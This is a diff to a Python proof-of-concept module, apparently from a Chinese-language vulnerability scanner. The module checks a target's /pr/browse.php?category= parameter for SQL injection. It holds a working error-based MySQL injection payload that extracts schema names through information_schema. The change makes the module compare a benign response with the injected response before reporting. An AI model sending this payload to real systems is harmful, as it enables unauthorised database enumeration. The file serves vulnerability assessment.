@@ -31,10 +31,15 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                     target=self.target, vuln=self.vuln))
-            payload = '/pr/browse.php?category=1 and(select 1 FROM(select count(*),concat((select (select (SELECT distinct concat(0x7e,0x27,cast(schema_name as char),0x27,0x7e) FROM information_schema.schemata LIMIT 0,1)) FROM information_schema.tables LIMIT 0,1),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)'
+            payload = "/pr/browse.php?category=1"
+            payload1 = '/pr/browse.php?category=1 and(select 1 FROM(select count(*),concat((select (select (SELECT distinct concat(0x7e,0x27,cast(schema_name as char),0x27,0x7e) FROM information_schema.schemata LIMIT 0,1)) FROM information_schema.tables LIMIT 0,1),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)'
+
             url = self.target + payload
-            response = requests.get(url)
-            self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
+            url1 = self.target + payload1
+            _response = requests.get(url)
+            _response1 = requests.get(url1)
+            if _response.text != _response1.text and (url == _response.url or url1 == _response1.url) and (_response.status_code == 200 or _response1.status_code == 200):
+                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                             target=self.target, name=self.vuln.name))
         except Exception, e:
             self.output.info('执行异常：{}'.format(e))
